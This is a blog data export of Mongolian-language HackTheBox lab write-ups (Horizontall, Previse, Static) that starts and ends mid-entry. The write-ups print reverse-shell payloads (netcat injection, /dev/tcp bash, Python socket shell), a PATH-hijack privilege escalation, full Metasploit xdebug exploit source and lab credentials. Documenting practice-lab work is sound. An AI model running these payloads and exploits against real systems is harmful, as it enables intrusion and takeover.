b\u0026#39;{\u0026#34;jwt\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2NjIxODcxLCJleHAiOjE2MzkyMTM4NzF9.OiegA_xE8zbXCJC02z9JK8_8DZs2I9kCzAE0Uk-2u5A\u0026#34;,\u0026#34;user\u0026#34;:{\u0026#34;id\u0026#34;:3,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@horizontall.htb\u0026#34;,\u0026#34;blocked\u0026#34;:null}}\u0026#39; 5. CVE-2019-19609 nc -lvnp 9001 Git:\ngit clone https://github.com/diego-tella/CVE-2019-19609-EXPLOIT python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2NjIyMDUxLCJleHAiOjE2MzkyMTQwNTF9.f93JYZArCGszsaQIPBtPZJKgq9QD4xRsViSPHqI9c-Y -l 10.10.14.139 -p 9001 shell баланс:\npython -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; User.txt\nc7978bf********* 6. Privilege Escalation myapi/config/environments/development/database.json:\n{ \u0026#34;defaultConnection\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;connections\u0026#34;: { \u0026#34;default\u0026#34;: { \u0026#34;connector\u0026#34;: \u0026#34;strapi-hook-bookshelf\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;client\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;database\u0026#34;: \u0026#34;strapi\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 3306, \u0026#34;username\u0026#34;: \u0026#34;developer\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34; }, \u0026#34;options\u0026#34;: {} } } } developer: #J!:F9Zt2u mysql руу нэвтэрч орж болно. Гэхдээ\nss -lp Нээлттэй байгаа порт шалгаж үзнэ. nmap-р харагдаагүй порт байгааг шалгаж байгаа. Порт 8000 нээлттэй байна. Machine -с port forward хийж нээлттэй байгаа порт руу authorized_keys дамжаад нэвтрэн орно. Орохын тулд ssh-keygen -г machine талдаа дахин generate хийгээд id_rsa.pub + vm id_rsa.pub -г autherized_keys дотор хуулж өгнө.\nport forwarding -г vm машин\nssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb VM хандалт хийгээд орж байвал ок -\u0026gt; LARAVEL\nhttp://127.0.0.1:8000/ Searchploit:\nsudo apt -y install exploitdb **searchsploit laravel** --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Laravel - \u0026#39;Hash::make()\u0026#39; Password Truncation Security | multiple/remote/39318.txt Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py Laravel Administrator 4 - Unrestricted File Upload (Authenticated) | php/webapps/49112.py Laravel Log Viewer \u0026lt; 0.13.0 - Local File Download | php/webapps/44343.py Laravel Nova 3.7.0 - \u0026#39;range\u0026#39; DoS | php/webapps/49198.txt PHP Laravel Framework 5.5.40 / 5.6.x \u0026lt; 5.6.30 - token Unserialize Remote Command Execution (Metasploit) | linux/remote/47129.rb UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read | php/webapps/48166.txt UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload | php/webapps/46389.py --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Laravel 8.4.2 debug mode - Remote code execution\nsearchsploit -p 49424 Exploit: Laravel 8.4.2 debug mode - Remote code execution URL: https://www.exploit-db.com/exploits/49424 Path: /usr/share/exploitdb/exploits/php/webapps/49424.py File Type: Python script, ASCII text executable Copied EDB-ID #49424\u0026#39;s path to the clipboard Хуулах:\ncp /usr/share/exploitdb/exploits/php/webapps/49424.py . Run\npython3 49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log \u0026#39;cat /root/root.txt\u0026#39; Port forward хийсэн машин руу нэвтэрч чадахгүй харин exploit ашиглаад замыг нь заагаад дотор нь байгаа зүйлийг хэвлэн харуулах\u0026hellip;\nRoot.txt\n6f8f2d****************** ","permalink":"https://cadil.github.io/posts/2024-02-24-htb-horizontall-writeup/","summary":"1. IP Address # Machine Address 10.10.11.105 # Local Address 10.10.14.139 horizontall.htb -\u0026gt; etc/chosts\n2. Nmap nmap -sV -sC -oA nmap/horizontall 10.10.11.105 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-11 02:22 EST Nmap scan report for 10.10.11.105 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.","title":"HTB - Horizontall"},{"content":"PS: Үүсгэсэн огноо: 2021 оны 11-р сарын 10~ өдрүүдэд бичсэн тэмдэглэл юм.\n1. IP Address # Machine Address 10.10.11.104 # Local Address 10.10.14.139 2. Nmap sudo nmap -sC -sV -oA nmap/previse 10.10.11.104 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 05:45 EST Nmap scan report for 10.10.11.104 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.40 seconds 3. Gobuster gobuster dir -u http://10.10.11.104 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2021/11/10 05:49:15 Starting gobuster in directory enumeration mode =============================================================== /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u0026gt; login.php] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u0026gt; login.php] Progress: 13674 / 441122 (3.10%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/11/10 05:54:51 Finished =============================================================== nav.php -\u0026gt; CREATE ACCOUNT LINK\n4. Burp GET /accounts.php HTTP/1.1 Host: 10.10.11.104 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Referer: http://10.10.11.104/nav.php Cookie: PHPSESSID=n8t6btqpv1in2cbte4c82i9ggh Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Do Intercept -\u0026gt; Response to this request дараад forward хийнэ. Дараагаар 302 гарч ирж байгааг 200 боглон forward хийнэ. Browser руу ороод харвал create user харагдаж байна. Шинэ user үүсгээд нэвтрэн орно.\n5. Reverse Shell File menu хэсэгт Backup файл байгаа татаж аваад config.php харвал:\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } Request Log Data Menu - comma татах үеийн burp:\nPOST /logs.php HTTP/1.1 Host: 10.10.11.104 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://10.10.11.104 DNT: 1 Connection: close Referer: http://10.10.11.104/file_logs.php Cookie: PHPSESSID=n8t6btqpv1in2cbte4c82i9ggh Upgrade-Insecure-Requests: 1 Sec-GPC: 1 delim=comma Netcat:\nnc -lvnp 9001 Reverse Shell:\ndelim=comma%26nc+-e+/bin/sh+10.10.14.139+9001 shell орсон бол:\npython3 \\-c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Backup доторх config.php info дээрээс харахад mysql руу орох боломжтой:\nmysql -u root -D previse -p Tables:\nSHOW TABLES\u0026#39; at line 2 mysql\u0026gt; show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; Accounts:\nmysql\u0026gt; SELECT * FROM accounts; SELECT * FROM accounts; +----+----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | ca4mi | $1$🧂llol$DHtkJzt.08/KEY8tpvplO0 | 2021-11-10 11:01:53 | | 3 | ashot | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-11-10 11:22:18 | +----+----------+------------------------------------+---------------------+ 3 rows in set (0.00 sec) User: m4lwhere Password: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.\nhashcat -a 3 -m 500 hash.txt rockyou.txt ilovecody112235!\nSHH хандах\nssh m4lwhere@10.10.11.104 User.txt\n90a************ 6. Privilege Escalation sudo -l:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh /opt/scripts/access_backup.sh\n@vm:\nnc -lvnp 9001 @Machine:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/9001 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; gzip chmod 777 gzip export PATH=/tmp:$PATH /tmp дотор байгаа болохоор бичлээ. Өөр газар байгаа бол **$(pwd):$PATH\nsudo -l-с гарч ирсэн .sh run:\nsudo /opt/scripts/access_backup.sh root.txt\n9dc5eb************ ","permalink":"https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/","summary":"PS: Үүсгэсэн огноо: 2021 оны 11-р сарын 10~ өдрүүдэд бичсэн тэмдэглэл юм.\n1. IP Address # Machine Address 10.10.11.104 # Local Address 10.10.14.139 2. Nmap sudo nmap -sC -sV -oA nmap/previse 10.10.11.104 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 05:45 EST Nmap scan report for 10.10.11.104 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.","title":"HTB - Previse"},{"content":"PS: Үүсгэсэн огноо: 2021 оны 11-р сарын 6~9 өдрүүдэд бичсэн тэмдэглэл юм.\n1. IP Address # Machine Address 10.10.10.246 # Local Address 10.10.14.22 2. Nmap sudo nmap -sC -sV -oA nmap/static 10.10.10.246 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 00:31 EDT Nmap scan report for 10.10.10.246 Host is up (0.21s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519) 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA) | 256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA) |_ 256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519) 8080/tcp open http Apache httpd 2.4.38 ((Debian)) | http-robots.txt: 2 disallowed entries |_/vpn/ /.ftp_uploads/ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 3. Gobuster gobuster dir -u http://10.10.10.246:8080/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x .php,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.246:8080/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2021/11/06 00:36:53 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 0] /robots.txt (Status: 200) [Size: 55] Progress: 117513 / 661683 (17.76%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/11/06 00:44:47 Finished =============================================================== Robot.txt\nUser-agent: * Disallow: /vpn/ Disallow: /.ftp_uploads/ 4. fixgz Git -с clone:\ngit clone https://github.com/yonjar/fixgz.git cpp compile:\ng++ fixgz.cpp -o fixgz broken gz засах:\n./fixgz db.sql.gz db.gz Unzip:\ngunzip db.gz cat db CREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); INSERT INTO users ( id, username, password, totp ) VALUES ( null, \u0026#39;admin\u0026#39;, \u0026#39;d033e22ae348aeb5660fc2140aec35850c4da997\u0026#39;, \u0026#39;orxxi4c7orxwwzlo\u0026#39; ); 5. Hash hash:\nd033e22ae348aeb5660fc2140aec35850c4da997 Файл болгов:\nvi hash d033e22ae348aeb5660fc2140aec35850c4da997 Hash тайлах:\njohn hash Output:\nCreated directory: /home/ca4mi/.john Warning: detected hash type \u0026#34;Raw-SHA1\u0026#34;, but the string is also recognized as \u0026#34;Raw-SHA1-AxCrypt\u0026#34; Use the \u0026#34;--format=Raw-SHA1-AxCrypt\u0026#34; option to force loading these as that type instead Warning: detected hash type \u0026#34;Raw-SHA1\u0026#34;, but the string is also recognized as \u0026#34;Raw-SHA1-Linkedin\u0026#34; Use the \u0026#34;--format=Raw-SHA1-Linkedin\u0026#34; option to force loading these as that type instead Warning: detected hash type \u0026#34;Raw-SHA1\u0026#34;, but the string is also recognized as \u0026#34;ripemd-160\u0026#34; Use the \u0026#34;--format=ripemd-160\u0026#34; option to force loading these as that type instead Warning: detected hash type \u0026#34;Raw-SHA1\u0026#34;, but the string is also recognized as \u0026#34;has-160\u0026#34; Use the \u0026#34;--format=has-160\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist admin (?) 1g 0:00:00:00 DONE 2/3 (2021-11-06 01:01) 20.00g/s 56480p/s 56480c/s 56480C/s abbott..admin1 Use the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably Session completed admin\n6. 2FA Machine, HTB-н VPN нарын цагийн бүс адилхан байх хэрэгтэй юм билээ. HTB дээрх сервер zone сольж ороод дахин үзсэн.\n/vpn/login.php: 2FA нэхэж байгаа https://addons.mozilla.org/en-US/firefox/addon/auth-helper/ - татаж аваад entry оруулаад орсон.\nhttp://10.10.10.246:8080/vpn/panel.php\n7. OVPN Support хэсгээс web - vpn татаж аваад ажилууллна.\nopenvpn web.ovpn Оutput:\n2021-11-06 04:25:07 Outgoing Control Channel Authentication: Using 160 bit message hash \u0026#39;SHA1\u0026#39; for HMAC authentication 2021-11-06 04:25:07 Incoming Control Channel Authentication: Using 160 bit message hash \u0026#39;SHA1\u0026#39; for HMAC authentication 2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:07 Could not determine IPv4/IPv6 protocol 2021-11-06 04:25:07 SIGUSR1[soft,init_instance] received, process restarting 2021-11-06 04:25:07 Restart pause, 40 second(s) 2021-11-06 04:25:47 Outgoing Control Channel Authentication: Using 160 bit message hash \u0026#39;SHA1\u0026#39; for HMAC authentication 2021-11-06 04:25:47 Incoming Control Channel Authentication: Using 160 bit message hash \u0026#39;SHA1\u0026#39; for HMAC authentication 2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) vpn.static.htb - танихгүй байгаа. etc/hosts дотор нэмэх. 172.20.0.10 - browser-с хандалт авахгүй байна.\nifconfig:\ntun9: flags=4305\u0026lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST\u0026gt; mtu 1500 inet 172.30.0.9 netmask 255.255.0.0 destination 172.30.0.9 inet6 fe80::9198:489e:ac83:105 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4 bytes 192 (192.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 tun9 -г route руу access хийнэ. Ингэснээр 172.30.0.9 -\u0026gt; 172.20.0.0/24:\nip route add 172.20.0.0/24 dev tun9 /Host/ Parrot OS - ip route add хийхэд sudo шаардсан. sudo-г нэмсэн.\n7. Metasploit - xdebug info.php ороод xdebug байгаа. Version: 2.6.0\nmetasploit: https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/ metasploit run:\nsudo msfdb run Тохируулга хийх:\nuse exploit/unix/http/xdebug_unauth_exec set PATH /vpn/login.php set RHOSTS 172.20.0.10 set LHOST tun9 set LPORT 9001 Тохиргоо:\nModule options (exploit/unix/http/xdebug_unauth_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PATH /vpn/login.php yes Path to target webapp Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 172.20.0.10 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes Callback host for accepting connections SRVPORT 9000 yes Port to listen for the debugger SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun9 yes The listen address (an interface may be specified) LPORT 9001 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Ажилууллах\nrun 1500 -\u0026gt; 1200 болгож үзсэн, exploit болохгүй байсан болохоор connection-д асуудал байна уу. Гэхдээ болоогүй.\nifconfig tun0 mtu 1200 metaexploit -с нь биш шууд ruby ажилууллах гэж үзсэн. Болоогүй.\n## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule \u0026lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Remote::HttpClient include Rex::Proto::Http def initialize(info = {}) super(update_info(info, \u0026#39;Name\u0026#39; =\u0026gt; \u0026#39;xdebug Unauthenticated OS Command Execution\u0026#39;, \u0026#39;Description\u0026#39; =\u0026gt; %q{ Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user. }, \u0026#39;DisclosureDate\u0026#39; =\u0026gt; \u0026#39;2017-09-17\u0026#39;, \u0026#39;Author\u0026#39; =\u0026gt; [ \u0026#39;Ricter Zheng\u0026#39;, #Discovery https://twitter.com/RicterZ \u0026#39;Shaksham Jaiswal\u0026#39;, # MinatoTW \u0026#39;Mumbai\u0026#39; # Austin Hudson ], \u0026#39;References\u0026#39; =\u0026gt; [ [\u0026#39;URL\u0026#39;, \u0026#39;https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/\u0026#39;], [\u0026#39;URL\u0026#39;, \u0026#39;https://paper.seebug.org/397/\u0026#39;] ], \u0026#39;License\u0026#39; =\u0026gt; MSF_LICENSE, \u0026#39;Platform\u0026#39; =\u0026gt; \u0026#39;php\u0026#39;, \u0026#39;Arch\u0026#39; =\u0026gt; [ARCH_PHP], \u0026#39;DefaultTarget\u0026#39; =\u0026gt; 0, \u0026#39;Stance\u0026#39; =\u0026gt; Msf::Exploit::Stance::Aggressive, \u0026#39;DefaultOptions\u0026#39; =\u0026gt; { \u0026#39;PAYLOAD\u0026#39; =\u0026gt; \u0026#39;php/meterpreter/reverse_tcp\u0026#39; }, \u0026#39;Payload\u0026#39; =\u0026gt; { \u0026#39;DisableNops\u0026#39; =\u0026gt; true, }, \u0026#39;Targets\u0026#39; =\u0026gt; [[ \u0026#39;Automatic\u0026#39;, {} ]], )) register_options([ OptString.new(\u0026#39;PATH\u0026#39;, [ true, \u0026#34;Path to target webapp\u0026#34;, \u0026#34;/index.php\u0026#34;]), OptAddress.new(\u0026#39;SRVHOST\u0026#39;, [ true, \u0026#34;Callback host for accepting connections\u0026#34;, \u0026#34;0.0.0.0\u0026#34;]), OptInt.new(\u0026#39;SRVPORT\u0026#39;, [true, \u0026#34;Port to listen for the debugger\u0026#34;, 9000]), Opt::RPORT(80), ]) end def check begin res = send_request_cgi({ \u0026#39;uri\u0026#39; =\u0026gt; datastore[\u0026#34;PATH\u0026#34;], \u0026#39;method\u0026#39; =\u0026gt; \u0026#39;GET\u0026#39;, \u0026#39;vars_get\u0026#39; =\u0026gt; { \u0026#39;XDEBUG_SESSION_START\u0026#39; =\u0026gt; rand_text_alphanumeric(10) } }) vprint_status \u0026#34;Request sent\\n#{res}\u0026#34; if res \u0026amp;\u0026amp; res.headers.to_s =~ /XDEBUG/i vprint_good(\u0026#34;Looks like remote server has xdebug enabled\\n\u0026#34;) return CheckCode::Detected else return CheckCode::Safe end rescue Rex::ConnectionError return CheckCode::Unknown end end def exploit payl = Rex::Text.encode_base64(\u0026#34;#{payload.encoded}\u0026#34;) cmd1 = \u0026#34;eval -i 1 -- \u0026#34; + Rex::Text.encode_base64(\u0026#34;eval(base64_decode(\\\u0026#34;#{payl}\\\u0026#34;));\u0026#34;) + \u0026#34;\\x00\u0026#34; webserver = Thread.new do begin server = Rex::Socket::TcpServer.create( \u0026#39;LocalPort\u0026#39; =\u0026gt; datastore[\u0026#39;SRVPORT\u0026#39;], \u0026#39;LocalHost\u0026#39; =\u0026gt; datastore[\u0026#39;SRVHOST\u0026#39;], \u0026#39;Context\u0026#39; =\u0026gt; { \u0026#39;Msf\u0026#39; =\u0026gt; framework, \u0026#39;MsfExploit\u0026#39; =\u0026gt; self }) client = server.accept print_status(\u0026#34;Waiting for client response.\u0026#34;) data = client.recv(1024) print_status(\u0026#34;Receiving response\u0026#34;) vprint_line(data) print_status(\u0026#34;Shell might take upto a minute to respond.Please be patient.\u0026#34;) print_status(\u0026#34;Sending payload of size #{cmd1.length} bytes\u0026#34;) client.write(cmd1) client.close server.close webserver.exit ensure webserver.exit end end send_request_cgi({ \u0026#39;uri\u0026#39; =\u0026gt; datastore[\u0026#39;PATH\u0026#39;], \u0026#39;method\u0026#39; =\u0026gt; \u0026#39;GET\u0026#39;, \u0026#39;headers\u0026#39; =\u0026gt; { \u0026#39;X-Forwarded-For\u0026#39; =\u0026gt; \u0026#34;#{lhost}\u0026#34;, \u0026#39;Cookie\u0026#39; =\u0026gt; \u0026#39;XDEBUG_SESSION=\u0026#39;+rand_text_alphanumeric(10) } }) end end Exploit болохгүй байсан. Тэгээд цаг нилээн аваад байхаар нь бэлэн rsa -г writeup, forum үзэж байгаад шууд хуулсан.\n-----BEGIN RSA PRIVATE KEY----- MII*********** -----END RSA PRIVATE KEY----- www-data - нэрээр нэвтэрч ороод user.txt авсан. -p 2222 бичихгүй бол болохгүй nmap дээр ssh порт 2222 гэж заасан байсан.\nssh -i id_rsa_www-data www-data@10.10.10.246 -p 2222 8. Privilege escalation ssh дотроос ifconfig:\neth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.20.0.10 netmask 255.255.255.0 broadcast 172.20.0.255 ether 02:42:ac:14:00:0a txqueuelen 0 (Ethernet) RX packets 376 bytes 47797 (47.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 275 bytes 72946 (72.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.254.2 netmask 255.255.255.0 broadcast 192.168.254.255 ether 02:42:c0:a8:fe:02 txqueuelen 0 (Ethernet) RX packets 48 bytes 29063 (29.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 25 bytes 1796 (1.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 28 bytes 1485 (1.4 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 28 bytes 1485 (1.4 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 192.168.254.2 -\u0026gt; 192.168.254.3 - ip хаяг\nPort forwarding (sudo):\nssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p 2222 -i id_rsa_www-data Out:\nThe authenticity of host \u0026#39;[10.10.10.246]:2222 ([10.10.10.246]:2222)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[10.10.10.246]:2222\u0026#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. Last login: Mon Nov 8 10:57:19 2021 from 10.10.14.84 localhost эсхүл 127.0.0.1 хандахаар:\nbatch mode: /usr/bin/ersatool create|print|revoke CN Browser -\u0026gt; Network цэсээр ороод харвал:\nX-Powered-By PHP-FPM/7.1 https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc https://github.com/theMiddleBlue/CVE-2019-11043 Git git clone https://github.com/theMiddleBlue/CVE-2019-11043.git dedsec.py: exploit.py ажилуулсны дараа бэлэн py ажилууллах rev shell. Бэлэн код аваад хуулсан.\nimport requests payload = \u0026#39;/usr/bin/python3.6 -c \\\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.254.2\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\\\u0026#39;\u0026#39; r = requests.get(\u0026#34;http://192.168.254.3/index.php?a=\u0026#34;+payload) print(r.text) Netcat: https://github.com/H74N/netcat-binaries/blob/master/nc\nДээр байгаа 3 файл хэрэгтэй. 